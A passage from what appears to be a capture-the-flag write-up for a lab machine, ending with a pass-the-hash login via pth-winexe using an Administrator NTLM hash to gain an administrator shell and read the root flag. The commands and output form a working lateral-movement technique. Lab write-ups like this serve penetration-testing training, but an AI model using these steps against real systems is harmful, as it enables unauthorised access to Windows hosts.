Once we hit send, we get a `root` shell


```
┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
└─# pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
silo\administrator
```
```

And I was able to grab the `root` flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
[REDACTED]
```
